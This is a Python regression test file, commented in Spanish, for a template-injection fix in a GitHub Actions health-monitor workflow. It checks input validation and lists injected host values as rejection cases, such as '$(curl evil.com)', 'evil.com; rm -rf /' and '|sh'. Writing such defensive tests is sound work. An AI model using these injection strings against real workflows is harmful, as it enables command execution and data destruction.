"""Test de regresión para la issue #406: template-injection en health-monitor.yml.

El workflow interpola directamente un input de workflow_dispatch en un shell command.
Un colaborador malicioso puede inyectar $(curl evil.com) como host.

Fix: validar el input como URL antes de usarlo mediante scripts/validate_host.py.
El workflow pasa host como variable de entorno, NO como interpolación directa en shell.
"""
import re
import subprocess
import sys
from pathlib import Path

HEALTH_MONITOR_YML = Path(__file__).resolve().parents[1] / ".github/workflows/health-monitor.yml"
VALIDATE_HOST_SCRIPT = Path(__file__).resolve().parents[1] / "scripts/validate_host.py"

# Regex que el script validate_host.py usa internamente
HOST_VALIDATOR_PATTERN = re.compile(
    r'^https?://'
    r'[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?'
    r'([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?'
    r'(:\d+)?'
    r'(/[a-zA-Z0-9\-\._/]*)?$'
)


def test_no_direct_interpolation_of_workflow_dispatch_input():
    """El input de workflow_dispatch NO debe interpolarse directamente en un shell `run`."""
    content = HEALTH_MONITOR_YML.read_text()
    lines = content.splitlines()
    run_lines = [l for l in lines if "run:" in l and ("python3 scripts/health_monitor" in l or "python3 scripts/validate_host" in l)]
    assert len(run_lines) > 0, "Debe existir steps run que invoquen health_monitor.py o validate_host.py"

    for line in run_lines:
        # La vulnerabilidad era '${{ github.event.inputs.host }}' INTERPOLADO DIRECTAMENTE EN run:.
        # En el fix, el host se pasa como $HEALTH_HOST o $HOST_INPUT (env var validada).
        assert "${{ github.event.inputs.host }}" not in line, (
            "FAIL: template-injection — el input se interpila directamente en el shell. "
            f"Línea: {line}"
        )


def test_host_validation_exists_before_use():
    """Debe existir un step validate-host antes del run-health-check."""
    content = HEALTH_MONITOR_YML.read_text()
    assert "validate-host" in content, "FAIL: no se encontró step de validación de host"
    assert "HOST_REGEX" in content, "FAIL: no se encontró HOST_REGEX en env del workflow"


def test_valid_hosts_pass_regex():
    """Hosts legítimos deben pasar el validador."""
    valid_hosts = [
        "https://lucidfence.local",
        "http://localhost:8765/health",
        "https://lucidfence-demo.pages.dev",
        "https://uem.local:8443/healthz",
    ]
    for h in valid_hosts:
        assert HOST_VALIDATOR_PATTERN.match(h), f"FAIL: '{h}' fue rechazado por el validador"


def test_malicious_hosts_rejected_by_regex():
    """Hosts con inyección de shell deben rechazarse."""
    malicious_hosts = [
        "$(curl evil.com)",
        "evil.com; rm -rf /",
        "https://valid.com && curl evil.com",
        "https://valid.com`whoami`",
        "$(curl evil.com)",
        "https://x.com|sh",
    ]
    for h in malicious_hosts:
        assert not HOST_VALIDATOR_PATTERN.match(h), (
            f"FAIL: '{h}' fue aceptado por el validador — inyección posible"
        )


def test_validate_host_script_rejects_injection():
    """El script validate_host.py debe rechazar inputs con inyección de shell."""
    result = subprocess.run(
        [sys.executable, str(VALIDATE_HOST_SCRIPT), "$(curl evil.com)"],
        capture_output=True, text=True
    )
    assert result.returncode == 1, (
        f"FAIL: validate_host.py aceptó inyección. stdout={result.stdout}, stderr={result.stderr}"
    )
    assert "template-injection" in result.stderr.lower() or "invalid" in result.stderr.lower()


def test_validate_host_script_accepts_valid_url():
    """El script validate_host.py debe aceptar URLs válidas."""
    result = subprocess.run(
        [sys.executable, str(VALIDATE_HOST_SCRIPT), "https://lucidfence.local/health"],
        capture_output=True, text=True
    )
    assert result.returncode == 0, (
        f"FAIL: validate_host.py rechazó URL válida. stderr={result.stderr}"
    )
    assert "ok" in result.stdout.lower()
